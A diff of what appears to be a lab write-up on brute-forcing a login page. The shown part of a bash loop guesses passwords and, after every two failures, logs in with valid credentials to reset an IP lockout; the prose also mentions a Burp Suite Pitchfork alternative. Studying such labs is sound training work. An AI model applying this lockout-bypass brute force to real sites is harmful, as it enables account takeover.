@@ -197,7 +197,6 @@ for ((i=0; i<${#passwords[@]}; i++)); do
 
  
   if [[ $fail_count -ge 2 ]]; then
-#    echo "Resetting IP block by logging in with valid credentials..."
     curl -s -X POST "$url" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "username=$reset_username&password=$reset_password" > /dev/null
@@ -207,7 +206,7 @@ done
 We executed the script and obtained the password:
 ![image](https://github.com/user-attachments/assets/298304e6-0291-42b9-949b-3c8a14c7d835)
 
-We could also have used a Burp Suite Pitchfork Attack by generating the lists (correct credentials every 2 incorrect ones). We will regenerate the lab and proceed to solve it this way.
+We could also have used a Burp Suite Intruder Pitchfork Attack by generating the lists (correct credentials every 2 incorrect ones). We will regenerate the lab and proceed to solve it this way.
 ```python
 #!/usr/bin/env python3
 
